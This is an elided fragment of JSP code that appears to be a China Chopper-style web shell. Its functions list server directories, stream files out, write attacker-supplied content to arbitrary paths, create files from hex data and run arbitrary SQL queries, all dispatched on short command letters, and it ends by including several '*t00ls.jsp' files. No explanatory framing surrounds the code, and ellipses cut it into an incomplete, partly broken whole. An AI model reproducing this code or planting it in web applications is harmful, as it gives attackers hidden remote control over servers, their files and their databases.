...
void BB(String s,StringBuffer sb)throws Exception{
    ...
    for(int i=0;i<l.length;i++){
        ...
        sT=fm.format(dt);sQ=l[i].canRead()?"R":"";
        sQ+=l[i].canWrite()?" W":"";
        if(l[i].isDirectory()){
...
void FF(String s,HttpServletResponse r)throws Exception{
    ...
    os.write(("|"+"<-").getBytes(),0,3);os.close();is.close();
    }          
    void GG(String s, String d)throws Exception{
        String h="0123456789ABCDEF";
        int n;
        File f=new File(s);f.createNewFile();          
    ...
    void QQ(String cs,String s,String q,StringBuffer sb)throws Exception{
        ...
        try{ResultSet r=m.executeQuery(q);
        ResultSetMetaData d=r.getMetaData();
    ...
    try{
        ...
        BufferedWriter pi=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
        pi.write(z2);
        pi.close();
        sb.append("1");
    }else if(Z.equals("E")){
    ...
    <%@include file="1t00ls.jsp"%>
    <%@include file="2t00ls.jsp"%>
    <%@include file="3t00ls.jsp"%>
    <%@include file="4t00ls.jsp"%>
    <%@include file="5t00ls.jsp"%>
    <%@include file="6t00ls.jsp"%>
%>
